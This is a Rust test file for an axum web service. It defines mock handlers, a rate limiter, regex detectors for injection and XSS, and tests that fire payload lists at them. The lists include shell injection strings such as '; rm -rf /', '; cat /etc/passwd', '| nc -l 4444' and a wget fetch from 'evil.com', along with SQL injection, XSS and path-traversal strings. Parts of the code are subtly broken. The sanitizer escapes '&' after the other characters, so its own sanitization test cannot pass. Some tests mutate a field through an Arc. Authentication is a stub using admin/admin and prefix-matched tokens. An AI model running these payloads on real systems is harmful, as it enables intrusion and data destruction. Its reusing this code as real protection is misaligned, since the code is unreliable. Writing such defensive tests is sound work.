use axum::{
    body::Body,
    extract::{Form, Query, State, Path},
    http::{Request, StatusCode, HeaderMap, HeaderValue},
    response::{Json, Response},
    routing::{get, post},
    Extension, Router,
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    collections::HashMap,
    sync::{Arc, atomic::{AtomicU64, Ordering}},
    time::{Duration, Instant},
};
use tokio::{sync::RwLock, time::sleep};
use tower::ServiceExt;
use uuid::Uuid;
use regex::Regex;

use crate::common::{TestDb, TestFixtures};
use crate::{assert_ok, assert_err};

// ===== SECURITY TEST INFRASTRUCTURE =====

#[derive(Debug, Clone)]
pub struct SecurityTestResult {
    pub test_name: String,
    pub vulnerability_detected: bool,
    pub severity: SecuritySeverity,
    pub description: String,
    pub mitigation_applied: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub enum SecuritySeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Debug, Clone)]
pub struct RateLimitConfig {
    pub max_requests: u32,
    pub time_window: Duration,
    pub block_duration: Duration,
}

impl Default for RateLimitConfig {
    fn default() -> Self {
        Self {
            max_requests: 100,
            time_window: Duration::from_secs(60),
            block_duration: Duration::from_secs(300),
        }
    }
}

#[derive(Debug, Clone)]
pub struct SecurityService {
    pub rate_limiter: Arc<RwLock<HashMap<String, RateLimitState>>>,
    pub blocked_ips: Arc<RwLock<HashMap<String, Instant>>>,
    pub suspicious_activities: Arc<RwLock<Vec<SuspiciousActivity>>>,
    pub config: RateLimitConfig,
}

#[derive(Debug, Clone)]
struct RateLimitState {
    requests: Vec<Instant>,
    blocked_until: Option<Instant>,
}

#[derive(Debug, Clone)]
struct SuspiciousActivity {
    ip: String,
    activity_type: String,
    timestamp: Instant,
    details: String,
}

impl SecurityService {
    pub fn new() -> Self {
        Self {
            rate_limiter: Arc::new(RwLock::new(HashMap::new())),
            blocked_ips: Arc::new(RwLock::new(HashMap::new())),
            suspicious_activities: Arc::new(RwLock::new(Vec::new())),
            config: RateLimitConfig::default(),
        }
    }

    pub async fn check_rate_limit(&self, ip: &str) -> bool {
        let mut limiter = self.rate_limiter.write().await;
        let now = Instant::now();
        
        let state = limiter.entry(ip.to_string()).or_insert_with(|| RateLimitState {
            requests: Vec::new(),
            blocked_until: None,
        });

        // Check if currently blocked
        if let Some(blocked_until) = state.blocked_until {
            if now < blocked_until {
                return false; // Still blocked
            } else {
                state.blocked_until = None; // Unblock
                state.requests.clear();
            }
        }

        // Clean old requests outside time window
        state.requests.retain(|&req_time| now.duration_since(req_time) < self.config.time_window);

        // Check rate limit
        if state.requests.len() >= self.config.max_requests as usize {
            // Block this IP
            state.blocked_until = Some(now + self.config.block_duration);
            
            // Log suspicious activity
            let mut activities = self.suspicious_activities.write().await;
            activities.push(SuspiciousActivity {
                ip: ip.to_string(),
                activity_type: "rate_limit_exceeded".to_string(),
                timestamp: now,
                details: format!("Exceeded {} requests in {:?}", self.config.max_requests, self.config.time_window),
            });

            false
        } else {
            state.requests.push(now);
            true
        }
    }

    pub async fn log_suspicious_activity(&self, ip: &str, activity_type: &str, details: &str) {
        let mut activities = self.suspicious_activities.write().await;
        activities.push(SuspiciousActivity {
            ip: ip.to_string(),
            activity_type: activity_type.to_string(),
            timestamp: Instant::now(),
            details: details.to_string(),
        });
    }

    pub async fn get_suspicious_activities(&self) -> Vec<SuspiciousActivity> {
        self.suspicious_activities.read().await.clone()
    }

    pub fn detect_sql_injection(&self, input: &str) -> bool {
        let sql_patterns = vec![
            r"(?i)(\s|^)(union|select|insert|update|delete|drop|create|alter|exec|execute)\s",
            r"(?i)(\s|^)('|\");?\s*(union|select|insert|update|delete|drop|create|alter)\s",
            r"(?i)(\s|^)(or|and)\s+\d+\s*=\s*\d+",
            r"(?i)(\s|^)(or|and)\s+'[^']*'\s*=\s*'[^']*'",
            r"(?i)(\s|^)(or|and)\s+true\s*$",
            r"(?i)(\s|^)(or|and)\s+false\s*$",
            r"(?i);\s*(drop|delete|update|insert|create|alter)\s",
            r"(?i)'\s*(or|and|union|select)\s",
        ];

        for pattern in sql_patterns {
            if Regex::new(pattern).unwrap().is_match(input) {
                return true;
            }
        }

        false
    }

    pub fn detect_xss(&self, input: &str) -> bool {
        let xss_patterns = vec![
            r"(?i)<script[^>]*>",
            r"(?i)<\/script>",
            r"(?i)javascript:",
            r"(?i)on\w+\s*=",
            r"(?i)<iframe[^>]*>",
            r"(?i)<object[^>]*>",
            r"(?i)<embed[^>]*>",
            r"(?i)<link[^>]*>",
            r"(?i)<meta[^>]*>",
            r"(?i)expression\s*\(",
            r"(?i)vbscript:",
            r"(?i)data:text/html",
        ];

        for pattern in xss_patterns {
            if Regex::new(pattern).unwrap().is_match(input) {
                return true;
            }
        }

        false
    }

    pub fn detect_command_injection(&self, input: &str) -> bool {
        let cmd_patterns = vec![
            r"(?i)[;&|`$(){}[\]<>]",
            r"(?i)\.\./",
            r"(?i)\\\\",
            r"(?i)(cmd|powershell|bash|sh|exec|eval|system)\s*[\(\[]",
            r"(?i)(cat|ls|dir|type|echo|wget|curl|nc|netcat)\s",
        ];

        for pattern in cmd_patterns {
            if Regex::new(pattern).unwrap().is_match(input) {
                return true;
            }
        }

        false
    }

    pub fn sanitize_input(&self, input: &str) -> String {
        // Basic sanitization - in production use a proper library
        input
            .replace("<script", "&lt;script")
            .replace("</script>", "&lt;/script&gt;")
            .replace("javascript:", "")
            .replace("'", "&#x27;")
            .replace("\"", "&quot;")
            .replace("&", "&amp;")
    }

    pub async fn validate_jwt(&self, token: &str, secret: &str) -> Result<HashMap<String, Value>, String> {
        // Simplified JWT validation for testing
        if token.is_empty() || secret.is_empty() {
            return Err("Invalid token or secret".to_string());
        }

        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            return Err("Invalid JWT format".to_string());
        }

        // In a real implementation, you would decode and verify the signature
        // For testing, we'll simulate validation
        if token.starts_with("valid_jwt_") {
            let mut claims = HashMap::new();
            claims.insert("sub".to_string(), json!("user123"));
            claims.insert("exp".to_string(), json!((chrono::Utc::now().timestamp() + 3600) as u64));
            Ok(claims)
        } else if token.starts_with("expired_jwt_") {
            Err("Token has expired".to_string())
        } else if token.starts_with("malformed_jwt_") {
            Err("Malformed token".to_string())
        } else {
            Err("Invalid token signature".to_string())
        }
    }
}

// Mock handlers for security testing
#[derive(Debug, Deserialize)]
struct LoginRequest {
    username: String,
    password: String,
}

#[derive(Debug, Deserialize)]
struct SearchRequest {
    query: String,
    category: Option<String>,
}

#[derive(Debug, Deserialize)]
struct FileRequest {
    filename: String,
    content: Option<String>,
}

async fn login_handler(
    State(security_service): State<Arc<SecurityService>>,
    Form(request): Form<LoginRequest>,
) -> Result<Json<Value>, StatusCode> {
    let client_ip = "127.0.0.1"; // In production, extract from headers

    // Check rate limiting
    if !security_service.check_rate_limit(client_ip).await {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }

    // Check for SQL injection in username
    if security_service.detect_sql_injection(&request.username) {
        security_service.log_suspicious_activity(
            client_ip,
            "sql_injection_attempt",
            &format!("Malicious username: {}", request.username)
        ).await;
        return Err(StatusCode::BAD_REQUEST);
    }

    // Simulate authentication
    if request.username == "admin" && request.password == "admin" {
        Ok(Json(json!({"status": "success", "token": "valid_jwt_admin"})))
    } else {
        Ok(Json(json!({"status": "error", "message": "Invalid credentials"})))
    }
}

async fn search_handler(
    State(security_service): State<Arc<SecurityService>>,
    Query(request): Query<SearchRequest>,
) -> Result<Json<Value>, StatusCode> {
    let client_ip = "127.0.0.1";

    // Check rate limiting
    if !security_service.check_rate_limit(client_ip).await {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }

    // Check for XSS in search query
    if security_service.detect_xss(&request.query) {
        security_service.log_suspicious_activity(
            client_ip,
            "xss_attempt",
            &format!("Malicious query: {}", request.query)
        ).await;
        return Err(StatusCode::BAD_REQUEST);
    }

    // Sanitize and process search
    let sanitized_query = security_service.sanitize_input(&request.query);
    
    Ok(Json(json!({
        "results": [],
        "query": sanitized_query,
        "total": 0
    })))
}

async fn file_handler(
    State(security_service): State<Arc<SecurityService>>,
    Json(request): Json<FileRequest>,
) -> Result<Json<Value>, StatusCode> {
    let client_ip = "127.0.0.1";

    // Check rate limiting
    if !security_service.check_rate_limit(client_ip).await {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }

    // Check for path traversal
    if request.filename.contains("../") || request.filename.contains("..\\") {
        security_service.log_suspicious_activity(
            client_ip,
            "path_traversal_attempt",
            &format!("Malicious filename: {}", request.filename)
        ).await;
        return Err(StatusCode::BAD_REQUEST);
    }

    // Check for command injection in content
    if let Some(content) = &request.content {
        if security_service.detect_command_injection(content) {
            security_service.log_suspicious_activity(
                client_ip,
                "command_injection_attempt",
                &format!("Malicious content in file: {}", request.filename)
            ).await;
            return Err(StatusCode::BAD_REQUEST);
        }
    }

    Ok(Json(json!({
        "status": "success",
        "filename": request.filename,
        "size": request.content.as_ref().map(|c| c.len()).unwrap_or(0)
    })))
}

async fn protected_handler(
    headers: HeaderMap,
    State(security_service): State<Arc<SecurityService>>,
) -> Result<Json<Value>, StatusCode> {
    // Extract JWT token
    let token = headers.get("Authorization")
        .and_then(|h| h.to_str().ok())
        .and_then(|s| s.strip_prefix("Bearer "))
        .ok_or(StatusCode::UNAUTHORIZED)?;

    // Validate JWT
    match security_service.validate_jwt(token, "test_secret").await {
        Ok(claims) => Ok(Json(json!({
            "status": "success",
            "user": claims.get("sub"),
            "message": "Access granted"
        }))),
        Err(_) => Err(StatusCode::UNAUTHORIZED),
    }
}

async fn admin_handler(
    headers: HeaderMap,
    State(security_service): State<Arc<SecurityService>>,
) -> Result<Json<Value>, StatusCode> {
    let client_ip = "127.0.0.1";

    // Extract JWT token
    let token = headers.get("Authorization")
        .and_then(|h| h.to_str().ok())
        .and_then(|s| s.strip_prefix("Bearer "))
        .ok_or(StatusCode::UNAUTHORIZED)?;

    // Validate JWT
    let claims = security_service.validate_jwt(token, "test_secret").await
        .map_err(|_| StatusCode::UNAUTHORIZED)?;

    // Check if user has admin privileges (simplified)
    if !token.contains("admin") {
        security_service.log_suspicious_activity(
            client_ip,
            "privilege_escalation_attempt",
            &format!("Non-admin user attempting admin access with token: {}", token)
        ).await;
        return Err(StatusCode::FORBIDDEN);
    }

    Ok(Json(json!({
        "status": "success",
        "admin_data": "sensitive admin information"
    })))
}

// Create test application with security middleware
fn create_secure_app(security_service: Arc<SecurityService>) -> Router {
    Router::new()
        .route("/login", post(login_handler))
        .route("/search", get(search_handler))
        .route("/file", post(file_handler))
        .route("/protected", get(protected_handler))
        .route("/admin", get(admin_handler))
        .with_state(security_service)
}

// Helper functions
fn create_request_with_headers(method: axum::http::Method, uri: &str, headers: Vec<(&str, &str)>, body: &str) -> Request<Body> {
    let mut builder = Request::builder()
        .method(method)
        .uri(uri);
    
    for (key, value) in headers {
        builder = builder.header(key, value);
    }
    
    builder.body(Body::from(body)).unwrap()
}

// ===== SECURITY TESTS =====

#[tokio::test]
async fn test_sql_injection_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    let sql_injection_payloads = vec![
        "admin' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin' UNION SELECT * FROM passwords --",
        "' OR 1=1 --",
        "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR '1'='1' /*",
        "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
    ];

    for payload in sql_injection_payloads {
        let form_data = format!("username={}&password=test", urlencoding::encode(payload));
        
        let request = Request::builder()
            .method("POST")
            .uri("/login")
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(Body::from(form_data))
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        
        // Should reject SQL injection attempts
        assert_eq!(response.status(), StatusCode::BAD_REQUEST, "Failed to block SQL injection: {}", payload);
    }

    // Verify suspicious activities were logged
    let activities = security_service.get_suspicious_activities().await;
    let sql_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "sql_injection_attempt")
        .collect();
    
    assert!(!sql_attempts.is_empty(), "SQL injection attempts should be logged");
}

#[tokio::test]
async fn test_xss_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    let xss_payloads = vec![
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src=javascript:alert('xss')></iframe>",
        "<svg onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<input type='text' onfocus=alert('xss') autofocus>",
        "';alert('xss');//",
    ];

    for payload in xss_payloads {
        let request = Request::builder()
            .method("GET")
            .uri(&format!("/search?query={}", urlencoding::encode(payload)))
            .body(Body::empty())
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        
        // Should reject XSS attempts
        assert_eq!(response.status(), StatusCode::BAD_REQUEST, "Failed to block XSS: {}", payload);
    }

    // Verify XSS attempts were logged
    let activities = security_service.get_suspicious_activities().await;
    let xss_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "xss_attempt")
        .collect();
    
    assert!(!xss_attempts.is_empty(), "XSS attempts should be logged");
}

#[tokio::test]
async fn test_command_injection_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    let command_injection_payloads = vec![
        "; cat /etc/passwd",
        "| ls -la",
        "& whoami",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "| nc -l 4444",
        "; wget http://evil.com/malware",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
    ];

    for payload in command_injection_payloads {
        let request_body = json!({
            "filename": "test.txt",
            "content": payload
        });

        let request = Request::builder()
            .method("POST")
            .uri("/file")
            .header("Content-Type", "application/json")
            .body(Body::from(request_body.to_string()))
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        
        // Should reject command injection attempts
        assert_eq!(response.status(), StatusCode::BAD_REQUEST, "Failed to block command injection: {}", payload);
    }

    // Verify command injection attempts were logged
    let activities = security_service.get_suspicious_activities().await;
    let cmd_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "command_injection_attempt")
        .collect();
    
    assert!(!cmd_attempts.is_empty(), "Command injection attempts should be logged");
}

#[tokio::test]
async fn test_path_traversal_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../../etc/shadow",
        "..\\..\\..\\..\\windows\\win.ini",
        "/var/log/../../etc/passwd",
    ];

    for payload in path_traversal_payloads {
        let request_body = json!({
            "filename": payload,
            "content": "test content"
        });

        let request = Request::builder()
            .method("POST")
            .uri("/file")
            .header("Content-Type", "application/json")
            .body(Body::from(request_body.to_string()))
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        
        // Should reject path traversal attempts
        assert_eq!(response.status(), StatusCode::BAD_REQUEST, "Failed to block path traversal: {}", payload);
    }

    // Verify path traversal attempts were logged
    let activities = security_service.get_suspicious_activities().await;
    let path_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "path_traversal_attempt")
        .collect();
    
    assert!(!path_attempts.is_empty(), "Path traversal attempts should be logged");
}

#[tokio::test]
async fn test_rate_limiting() {
    let mut config = RateLimitConfig::default();
    config.max_requests = 5; // Low limit for testing
    config.time_window = Duration::from_secs(10);
    
    let security_service = Arc::new(SecurityService::new());
    security_service.config = config;
    
    let app = create_secure_app(security_service.clone());

    // Make requests up to the limit
    for i in 0..5 {
        let form_data = format!("username=user{}&password=pass", i);
        
        let request = Request::builder()
            .method("POST")
            .uri("/login")
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(Body::from(form_data))
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        assert_ne!(response.status(), StatusCode::TOO_MANY_REQUESTS, "Request {} should not be rate limited", i);
    }

    // The next request should be rate limited
    let form_data = "username=user6&password=pass";
    let request = Request::builder()
        .method("POST")
        .uri("/login")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(Body::from(form_data))
        .unwrap();

    let response = app.oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS, "Should be rate limited");

    // Verify rate limiting was logged
    let activities = security_service.get_suspicious_activities().await;
    let rate_limit_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "rate_limit_exceeded")
        .collect();
    
    assert!(!rate_limit_attempts.is_empty(), "Rate limit exceeded should be logged");
}

#[tokio::test]
async fn test_jwt_authentication() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    // Test valid JWT
    let request = create_request_with_headers(
        axum::http::Method::GET,
        "/protected",
        vec![("Authorization", "Bearer valid_jwt_user123")],
        ""
    );

    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK, "Valid JWT should be accepted");

    // Test expired JWT
    let request = create_request_with_headers(
        axum::http::Method::GET,
        "/protected",
        vec![("Authorization", "Bearer expired_jwt_user123")],
        ""
    );

    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED, "Expired JWT should be rejected");

    // Test malformed JWT
    let request = create_request_with_headers(
        axum::http::Method::GET,
        "/protected",
        vec![("Authorization", "Bearer malformed_jwt_invalid")],
        ""
    );

    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED, "Malformed JWT should be rejected");

    // Test missing JWT
    let request = Request::builder()
        .method("GET")
        .uri("/protected")
        .body(Body::empty())
        .unwrap();

    let response = app.oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED, "Missing JWT should be rejected");
}

#[tokio::test]
async fn test_privilege_escalation_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    // Test regular user trying to access admin endpoint
    let request = create_request_with_headers(
        axum::http::Method::GET,
        "/admin",
        vec![("Authorization", "Bearer valid_jwt_user123")],
        ""
    );

    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN, "Non-admin should be forbidden");

    // Test admin user accessing admin endpoint
    let request = create_request_with_headers(
        axum::http::Method::GET,
        "/admin", 
        vec![("Authorization", "Bearer valid_jwt_admin")],
        ""
    );

    let response = app.oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK, "Admin should have access");

    // Verify privilege escalation attempt was logged
    let activities = security_service.get_suspicious_activities().await;
    let escalation_attempts: Vec<_> = activities.iter()
        .filter(|a| a.activity_type == "privilege_escalation_attempt")
        .collect();
    
    assert!(!escalation_attempts.is_empty(), "Privilege escalation attempts should be logged");
}

#[tokio::test]
async fn test_input_sanitization() {
    let security_service = Arc::new(SecurityService::new());

    let malicious_inputs = vec![
        ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
        ("javascript:alert('evil')", "alert(&#x27;evil&#x27;)"),
        ("<img src=x onerror=alert('xss')>", "&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt;"),
        ("\"';DROP TABLE users;--", "&quot;&#x27;;DROP TABLE users;--"),
        ("<iframe src='evil.com'></iframe>", "&lt;iframe src=&#x27;evil.com&#x27;&gt;&lt;/iframe&gt;"),
    ];

    for (input, expected) in malicious_inputs {
        let sanitized = security_service.sanitize_input(input);
        assert_eq!(sanitized, expected, "Input not properly sanitized: {}", input);
    }
}

#[tokio::test]
async fn test_security_headers() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service);

    let request = Request::builder()
        .method("GET")
        .uri("/search?query=test")
        .body(Body::empty())
        .unwrap();

    let response = app.oneshot(request).await.unwrap();
    
    // In a real application, you would check for security headers like:
    // - X-Content-Type-Options: nosniff
    // - X-Frame-Options: DENY
    // - X-XSS-Protection: 1; mode=block
    // - Content-Security-Policy
    // - Strict-Transport-Security

    assert_eq!(response.status(), StatusCode::OK);
    
    // For testing purposes, we'll just verify the response is successful
    // In production, add proper security header validation
}

#[tokio::test]
async fn test_session_security() {
    let security_service = Arc::new(SecurityService::new());

    // Test JWT validation with various scenarios
    let test_cases = vec![
        ("", "test_secret", false, "Empty token"),
        ("valid_jwt_test", "", false, "Empty secret"),
        ("invalid_format", "test_secret", false, "Invalid format"),
        ("valid_jwt_test", "test_secret", true, "Valid token"),
        ("expired_jwt_test", "test_secret", false, "Expired token"),
        ("malformed_jwt_test", "test_secret", false, "Malformed token"),
    ];

    for (token, secret, should_succeed, description) in test_cases {
        let result = security_service.validate_jwt(token, secret).await;
        
        if should_succeed {
            assert!(result.is_ok(), "Failed: {}", description);
        } else {
            assert!(result.is_err(), "Should have failed: {}", description);
        }
    }
}

#[tokio::test]
async fn test_brute_force_protection() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    // Simulate brute force attack
    let passwords = vec!["admin", "password", "123456", "admin123", "root", "qwerty"];
    let mut successful_attempts = 0;
    let mut blocked_attempts = 0;

    for password in passwords {
        let form_data = format!("username=admin&password={}", password);
        
        let request = Request::builder()
            .method("POST")
            .uri("/login")
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(Body::from(form_data))
            .unwrap();

        let response = app.clone().oneshot(request).await.unwrap();
        
        match response.status() {
            StatusCode::OK => {
                successful_attempts += 1;
                if password == "admin" {
                    // This is expected for the correct password
                } else {
                    panic!("Unexpected successful login with password: {}", password);
                }
            }
            StatusCode::TOO_MANY_REQUESTS => {
                blocked_attempts += 1;
            }
            _ => {
                // Normal failed attempt
            }
        }
        
        // Small delay between attempts
        sleep(Duration::from_millis(10)).await;
    }

    // Should have rate limited after too many attempts
    assert!(blocked_attempts > 0 || successful_attempts <= 1, 
        "Brute force protection failed - too many successful attempts: {}", successful_attempts);
}

#[tokio::test]
async fn test_concurrent_security_attacks() {
    let security_service = Arc::new(SecurityService::new());
    let app = Arc::new(create_secure_app(security_service.clone()));
    
    let attack_types = vec![
        ("sql_injection", "admin' OR '1'='1"),
        ("xss", "<script>alert('xss')</script>"),
        ("command_injection", "; cat /etc/passwd"),
        ("path_traversal", "../../../etc/passwd"),
    ];

    let mut tasks = vec![];

    // Launch concurrent attacks
    for (attack_type, payload) in attack_types {
        for i in 0..10 {
            let app_clone = app.clone();
            let payload_clone = payload.to_string();
            
            let task = tokio::spawn(async move {
                let request = match attack_type {
                    "sql_injection" => {
                        let form_data = format!("username={}&password=test{}", 
                            urlencoding::encode(&payload_clone), i);
                        Request::builder()
                            .method("POST")
                            .uri("/login")
                            .header("Content-Type", "application/x-www-form-urlencoded")
                            .body(Body::from(form_data))
                            .unwrap()
                    }
                    "xss" => {
                        Request::builder()
                            .method("GET")
                            .uri(&format!("/search?query={}&id={}", 
                                urlencoding::encode(&payload_clone), i))
                            .body(Body::empty())
                            .unwrap()
                    }
                    _ => {
                        let request_body = json!({
                            "filename": format!("{}_{}", payload_clone, i),
                            "content": "test"
                        });
                        Request::builder()
                            .method("POST")
                            .uri("/file")
                            .header("Content-Type", "application/json")
                            .body(Body::from(request_body.to_string()))
                            .unwrap()
                    }
                };

                app_clone.clone().oneshot(request).await
            });
            
            tasks.push(task);
        }
    }

    // Wait for all attacks to complete
    let results = futures::future::join_all(tasks).await;
    
    // All attacks should be blocked
    for result in results {
        let response = result.unwrap().unwrap();
        assert!(
            response.status() == StatusCode::BAD_REQUEST || 
            response.status() == StatusCode::TOO_MANY_REQUESTS,
            "Attack should be blocked, got status: {}", response.status()
        );
    }

    // Verify all attack types were detected and logged
    let activities = security_service.get_suspicious_activities().await;
    
    let attack_types_detected: std::collections::HashSet<_> = activities
        .iter()
        .map(|a| a.activity_type.as_str())
        .collect();
    
    assert!(attack_types_detected.contains("sql_injection_attempt"), "SQL injection should be detected");
    assert!(attack_types_detected.contains("xss_attempt"), "XSS should be detected");
    
    println!("Detected {} suspicious activities across {} attack types", 
        activities.len(), attack_types_detected.len());
}

#[tokio::test]
async fn test_security_configuration() {
    // Test different security configurations
    let configs = vec![
        RateLimitConfig {
            max_requests: 10,
            time_window: Duration::from_secs(60),
            block_duration: Duration::from_secs(300),
        },
        RateLimitConfig {
            max_requests: 100,
            time_window: Duration::from_secs(60),
            block_duration: Duration::from_secs(60),
        },
        RateLimitConfig {
            max_requests: 1,
            time_window: Duration::from_secs(10),
            block_duration: Duration::from_secs(600),
        },
    ];

    for (i, config) in configs.into_iter().enumerate() {
        println!("Testing security configuration {}", i + 1);
        
        let security_service = Arc::new(SecurityService::new());
        security_service.config = config.clone();
        
        let app = create_secure_app(security_service.clone());

        // Test rate limiting with this configuration
        let mut blocked = false;
        for j in 0..(config.max_requests + 2) {
            let form_data = format!("username=user{}&password=pass", j);
            
            let request = Request::builder()
                .method("POST")
                .uri("/login")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(Body::from(form_data))
                .unwrap();

            let response = app.clone().oneshot(request).await.unwrap();
            
            if response.status() == StatusCode::TOO_MANY_REQUESTS {
                blocked = true;
                break;
            }
        }

        assert!(blocked, "Rate limiting should have triggered for config {}", i + 1);
    }
}

#[tokio::test]
async fn test_security_metrics_and_monitoring() {
    let security_service = Arc::new(SecurityService::new());
    let app = create_secure_app(security_service.clone());

    // Generate various security events
    let security_events = vec![
        ("POST", "/login", "username=admin%27%20OR%20%271%27%3D%271&password=test"),
        ("GET", "/search?query=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", ""),
        ("POST", "/file", r#"{"filename":"../../../etc/passwd","content":"test"}"#),
    ];

    for (method, uri, body) in security_events {
        let request = Request::builder()
            .method(method)
            .uri(uri)
            .header("Content-Type", if method == "POST" && uri == "/login" {
                "application/x-www-form-urlencoded"
            } else {
                "application/json"
            })
            .body(Body::from(body))
            .unwrap();

        let _response = app.clone().oneshot(request).await.unwrap();
    }

    // Verify security metrics
    let activities = security_service.get_suspicious_activities().await;
    
    let metrics = SecurityMetrics::from_activities(&activities);
    
    assert!(metrics.total_attacks > 0, "Should have recorded attacks");
    assert!(metrics.attack_types.len() > 0, "Should have different attack types");
    assert!(metrics.blocked_ips.len() >= 0, "Should track blocked IPs");
    
    println!("Security Metrics: {:?}", metrics);
}

// Security metrics helper
#[derive(Debug)]
struct SecurityMetrics {
    total_attacks: usize,
    attack_types: HashMap<String, usize>,
    blocked_ips: HashMap<String, usize>,
}

impl SecurityMetrics {
    fn from_activities(activities: &[SuspiciousActivity]) -> Self {
        let mut attack_types = HashMap::new();
        let mut blocked_ips = HashMap::new();

        for activity in activities {
            *attack_types.entry(activity.activity_type.clone()).or_insert(0) += 1;
            *blocked_ips.entry(activity.ip.clone()).or_insert(0) += 1;
        }

        Self {
            total_attacks: activities.len(),
            attack_types,
            blocked_ips,
        }
    }
}